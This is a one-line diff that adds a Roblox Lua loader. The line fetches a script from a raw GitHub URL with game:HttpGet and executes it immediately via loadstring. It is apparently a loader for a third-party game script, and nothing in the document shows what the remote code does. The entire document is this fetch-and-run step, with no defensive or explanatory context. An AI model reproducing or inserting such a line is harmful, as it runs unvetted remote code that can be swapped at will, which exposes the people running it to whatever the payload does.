@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/v8trf9c2p3h7g46/refs/heads/main/Vanguards"))()
